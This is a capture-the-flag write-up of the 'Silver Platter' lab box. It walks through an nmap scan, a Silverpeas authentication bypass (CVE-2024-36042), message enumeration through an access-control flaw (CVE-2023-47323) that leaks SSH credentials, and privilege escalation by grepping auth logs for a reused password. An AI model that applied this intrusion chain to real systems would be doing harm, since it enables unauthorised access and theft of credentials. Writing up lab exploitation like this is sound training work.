# Silver Platter



## Ports Scan

```bash
nmap -T4 -A -p 22,80,8080 --min-rate 1000 10.10.49.42 -oN port_scan.txt -Pn

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3b:f4:48:e3:17:b8:3a:33:32:cb:b6:79:82:96:07:aa (ECDSA)
|_  256 3b:1f:a3:fe:0b:2c:79:9a:58:98:66:e6:cf:81:aa:72 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Thu, 24 Jul 2025 07:43:20 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Thu, 24 Jul 2025 07:43:19 GMT
|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
```



## Web Enumeration

In the web site contact page we found this:

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Probably other HTTP port 8080 is a Silverpeas server.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



Searching on internet we can get that the default port might be the `8080` and the default route is `/silverpeas`.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### CVE-2024-36042 - Silverpeas Auth Bypass

Looking the years in the bottom of the page i can image that the software is not updated.

And... searching on web we have found a Authentication Bypass vulnerability

{% embed url="https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d" %}

I tried to replicate this PoC and tata...

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### CVE-2023-47323 - SilverPeas Broken Access Control

The version of the service is the 6.3.1

We can search on the web the version to find vulnerabilities

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The CVE-2023-47322 looks interesting, it should allow us to read all message of all users.

{% embed url="https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323" %}

```
http://10.10.206.103:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=1
```

Change the ID with BurpSuite we can enumerate the messages. Taking a look to the message with ID 6, this message contains SSH credentials

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
SSH credential
tim:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```



## Initial Access

SSh connection

```bash
ssh tim@10.10.206.103
> cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

First things first, let's go to print the user flag

```bash
cat /home/tim/user.txt
```



## Privilege Escalation

### "adm" group PrivEsc

```bash
id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

> Traditionally the `adm` group is used to give a user access to some sort of system log files.\
> See e.g. `ls -l /var/log`.

With the log files acces, we can grep possible cleat-text password

{% code overflow="wrap" %}
```bash
cat /var/log/auth* | grep -i --text "pass"

Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1

```
{% endcode %}

With this password we can try to do password spray with know users.

```bash
su tyler
> _Zd_zx7N823/
```

That's it, we have access as tyler.

```bash
sudo -l

User tyler may run the following commands on ip-10-10-142-94:
    (ALL : ALL) ALL
```

User tyler has all privilege, and with this user we can became root.

```bash
sudo su
```

Now that we are root, we can print the root flag.

```bash
cat /root/root.txt
```



